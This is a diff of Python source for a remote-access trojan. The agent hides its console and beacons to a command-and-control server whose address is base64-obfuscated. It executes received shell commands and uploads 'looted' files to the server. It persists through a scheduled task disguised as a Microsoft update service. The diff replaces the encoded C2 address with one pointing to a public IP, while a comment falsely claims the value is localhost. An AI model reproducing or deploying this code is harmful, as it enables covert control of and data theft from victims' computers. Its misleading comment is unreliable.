@@ -11,7 +11,7 @@ import shutil
 # --- Configuration ---
 # Obfuscated C2 URL to make it less obvious.
 # This is "http://localhost:8080" base64 encoded.
-C2_URL_B64 = "aHR0cDovL2hpdC13ZWRkaW5nLmdsLmF0LnBseS5nZzo1OTEwMg=="
+C2_URL_B64 = "aHR0cDovLzIxNy4xNTQuMjAxLjE2NDo0MTIx"
 # -------------------
 
 # --- Windows-Specific Persistence and Stealth ---
@@ -43,14 +43,14 @@ def setup_persistence():
         if os.path.abspath(sys.executable).lower() != agent_path.lower():
             os.makedirs(agent_dir, exist_ok=True)
             shutil.copy(sys.executable, agent_path)
-            
+
             # Create a scheduled task to run on user logon
             command = (
                 f'schtasks /create /tn "Microsoft System Update Service" '
                 f'/tr "{agent_path}" /sc onlogon /rl HIGHEST /f'
             )
             subprocess.run(command, shell=True, capture_output=True)
-            
+
             # Optional: Run the new process and exit the current one
             subprocess.Popen([agent_path])
             sys.exit(0)
@@ -106,7 +106,7 @@ class SmartAgent:
                 return f"Changed directory to {os.getcwd()}"
             except Exception as e:
                 return str(e)
-        
+
         if command.lower().startswith('loot '):
             return self.upload_file(command.strip().split(maxsplit=1)[1])
 
@@ -124,7 +124,7 @@ class SmartAgent:
         """Uploads a specified file to the C2 server."""
         if not os.path.exists(file_path) or not os.path.isfile(file_path):
             return f"Error: File not found or is not a file: {file_path}"
-        
+
         try:
             upload_url = f"{self.c2_url}/api/loot/upload"
             with open(file_path, 'rb') as f:
@@ -135,9 +135,9 @@ class SmartAgent:
                     'original_path': os.path.abspath(file_path)
                 }
                 files = {'lootFile': (os.path.basename(file_path), f)}
-                
+
                 response = requests.post(upload_url, data=payload, files=files, timeout=60)
-                
+
                 if response.status_code == 200:
                     return f"Successfully looted and uploaded {file_path}"
                 else:
@@ -169,14 +169,14 @@ class SmartAgent:
                     if not self.handle_special_commands(command):
                         results = self.execute_command(command)
                         self.send_results(results)
-            
+
             interval = self.live_interval if self.mode == "live" else self.beacon_interval
             time.sleep(interval)
 
 if __name__ == "__main__":
     hide_console()
     # Uncomment the line below to enable persistence when you compile the EXE
-    # setup_persistence() 
-    
+    # setup_persistence()
+
     agent = SmartAgent()
     agent.start()
